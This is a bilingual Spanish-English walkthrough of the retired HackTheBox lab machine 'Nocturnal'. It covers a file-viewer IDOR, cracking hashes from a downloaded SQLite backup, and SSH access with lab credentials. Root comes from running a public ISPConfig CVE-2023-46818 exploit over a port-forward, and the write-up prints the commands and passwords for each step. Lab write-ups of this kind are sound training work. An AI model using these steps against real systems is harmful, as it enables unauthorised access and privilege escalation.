# Nocturnal [Easy]

> **ES:** Máquina Linux con app PHP de subida de ficheros: IDOR para leer documentos ajenos, backup con SQLite, hashes craqueados y root vía ISPConfig.
> **EN:** Linux machine with a PHP file-upload app: IDOR to read others' documents, backup with SQLite, cracked hashes, and root via ISPConfig.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | FisMatHack |
| **URL** | https://app.hackthebox.com/machines/Nocturnal |
| **IP lab** | 10.10.11.64 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Nocturnal (video)](https://youtube.com/watch?v=tjA3sXsnPqw) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía IDOR (`view.php`) → credencial de `amanda` → panel admin → backup con SQLite → SSH como `tobias` → CVE-2023-46818 en ISPConfig.
> **EN:** Get `user.txt` and `root.txt` via IDOR (`view.php`) → `amanda`'s credential → admin panel → backup with SQLite → SSH as `tobias` → CVE-2023-46818 in ISPConfig.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] dirsearch / ffuf (rutas `admin.php`, `backups`, `uploads`, `view.php`)
- [ ] Burp (IDOR en visor de ficheros)
- [ ] sqlite3 + hashcat / john (hashes de la DB del backup)
- [ ] ssh (`tobias`) + port-forward (8080)
- [ ] exploit ISPConfig CVE-2023-46818 (bipbopbup)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo de puertos y registro de `nocturnal.htb`; la web redirige por nombre y expone login/registro con subida de ficheros.
> **EN:** Port scan and registering `nocturnal.htb`; the site redirects by name and exposes login/register with file upload.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.64
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
curl -i http://10.10.11.64/  # 302 -> http://nocturnal.htb/
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp nginx 1.18.0 → `nocturnal.htb`. Capturas del login/dashboard en `images/` y en `img/image_20250555-095548.png`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Fuzzing web: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/` (403), `/uploads*` (403). Se registra un usuario (`1123:1123`) y se prueba la subida: el filtrado es estricto, no es la vía. El visor `view.php?username=<user>&file=<name>` sufre IDOR: cambiando `username` se leen ficheros de otros usuarios.
> **EN:** Web fuzzing: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/` (403), `/uploads*` (403). Register a user (`1123:1123`) and test upload: filtering is strict, not the way in. The viewer `view.php?username=<user>&file=<name>` suffers IDOR: changing `username` reads other users' files.

```bash
dirsearch -u http://nocturnal.htb/
# /admin.php -> login.php, /backups (403), /uploads* (403), /view.php -> login.php
# tras registro+login y subir un pdf:
# http://nocturnal.htb/view.php?username=wither&file=test.pdf
# IDOR:
# http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

**Resultado / Result:** El `privacy.odt` de `amanda` contiene password temporal de IT: `amanda : arHkG7HAI68X8s1J` (válida en todos los servicios; credencial de laboratorio retirado). Capturas del visor en `images/`; registro/subida en `img/` (`img/image_20250557-095742.png`, `img/image_20250559-095914.png`).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con `amanda` se entra al panel admin: permite backup del sistema (descargable) y ver código. Del backup se extrae `nocturnal_database.db` con hashes; solo el de `tobias` se crackea → SSH.
> **EN:** With `amanda` enter the admin panel: it allows system backup (downloadable) and code view. From the backup extract `nocturnal_database.db` with hashes; only `tobias`'s cracks → SSH.

```bash
# login como amanda -> panel admin -> descargar backup
# del backup: nocturnal_database.db
sqlite3 nocturnal_database.db ".tables"
sqlite3 nocturnal_database.db "SELECT * FROM users;"
hashcat hashes.txt rockyou.txt  # solo tobias cae
ssh tobias@10.10.11.64  # slowmotionapocalypse (credencial de laboratorio retirado)
```

**Resultado / Result:** Shell como `tobias` por SSH. Capturas del admin/backup/DB en `images/`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El home de `tobias` contiene `user.txt`.
> **EN:** `tobias`'s home contains `user.txt`.

```bash
ls -la /home/tobias/
cat /home/tobias/user.txt  # formato parcial ofuscado
```

**Resultado / Result:** `user.txt` como `tobias`.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `tobias` no tiene `sudo`. En `netstat` aparece `127.0.0.1:8080` (además de MySQL 3306, SMTP 587, 33060): es ISPConfig. Con port-forward se confirma el panel y se explota `ISPConfig - PHP Code Injection (CVE-2023-46818)` con `admin : slowmotionapocalypse` (reuse de la clave de `tobias`) → shell root.
> **EN:** `tobias` has no `sudo`. `netstat` shows `127.0.0.1:8080` (plus MySQL 3306, SMTP 587, 33060): it is ISPConfig. Port-forward to confirm the panel and exploit `ISPConfig - PHP Code Injection (CVE-2023-46818)` with `admin : slowmotionapocalypse` (reuse of `tobias`'s password) → root shell.

```bash
sudo -l  # Sorry, user tobias may not run sudo on nocturnal.
netstat -ntlp  # 127.0.0.1:8080, 127.0.0.1:3306, 127.0.0.1:587, 127.0.0.1:33060
ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64
# http://localhost:8080 -> ISPConfig. Captura en images/
git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git
python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
whoami  # root
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Técnica: RCE en ISPConfig (CVE-2023-46818). Captura del panel en `images/`.

---

## 🧠 Lo aprendido / Learned

> **ES:** IDOR en visores de ficheros (`username` manipulable); backups descargables = código + hashes; reuse de clave de sistema (`tobias` → admin ISPConfig); servicios solo-loopback (8080) vía port-forward; privesc vía app de hosting.
> **EN:** IDOR in file viewers (manipulable `username`); downloadable backups = code + hashes; system password reuse (`tobias` → ISPConfig admin); loopback-only services (8080) via port-forward; privesc via hosting app.

- [ ] IDOR + backups expuestos (SQLite) para escalar a admin
- [ ] SQLite + craqueo + SSH (`tobias:slowmotionapocalypse`)
- [ ] ISPConfig CVE-2023-46818 hacia root

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (nota parcial/TODO con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: IDOR `amanda/privacy.odt`, `nocturnal_database.db`, `netstat` 8080, PoC bipbopbup) — wither/nota migrada
- **Walkthrough de referencia:** HackTheBox | Nocturnal — https://benheater.com/hackthebox-nocturnal — 0xBEN
- **Referencia técnica:** ISPConfig CVE-2023-46818 PoC — https://github.com/bipbopbup/CVE-2023-46818-python-exploit — bipbopbup
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
